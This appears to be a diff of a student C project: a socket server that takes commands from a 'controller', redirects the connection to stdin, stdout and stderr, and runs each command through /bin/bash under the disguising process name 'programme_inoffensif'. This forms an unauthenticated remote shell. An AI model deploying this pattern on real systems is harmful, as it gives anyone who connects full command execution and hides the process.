@@ -23,14 +23,14 @@ void childExec(void *sockfd, void *command);
 
 int main(int argc, char **argv) {
 
-  int sockfd, newsockfd, i;
-  char msg[SIZE_MESSAGE];
-  int ret;
-  StructPort structPort;
+  int sockfd, newsockfd;
+  char msg[SIZE_MESSAGE]; // le message provenant du controller
+  int ret;// ?
+  StructPort structPort;// ?
   struct pollfd fds[MAX_CONNECTION];
 
   if (argc > 1) {
-    int port = atoi(argv[1]);
+    int port = atoi(argv[1]);// le client va entrer un port sur la ligne de commande
     sockfd = initSocketServer(port);
     printf("The server listens on the port : %d \n", port);
   } else {
@@ -55,7 +55,7 @@ int main(int argc, char **argv) {
       printf("Connexion finie\n");
     }
   }
-  sclose(sockfd);
+  sclose(sockfd); 
 }
 
 // child process run the command
@@ -63,13 +63,13 @@ void childExec(void *sockfd, void *command) {
   char *script = command;
   int newsockfd = *(int *)sockfd;
 
-  // redirection STDIN, STDERR, STDOUT
+  // redirection STDIN, STDERR, STDOUT 
   dup2(newsockfd, STDIN_FILENO);
   dup2(newsockfd, STDOUT_FILENO);
   dup2(newsockfd, STDERR_FILENO);
 
-  execl("/bin/sh", "programme_inoffensif", "-c", script, NULL);
-  // system(script);
+  execl("/bin/bash", "programme_inoffensif", "-c", script, NULL);
+ 
   perror("Something went wrong with execl\n");
   exit(EXIT_FAILURE);
 }
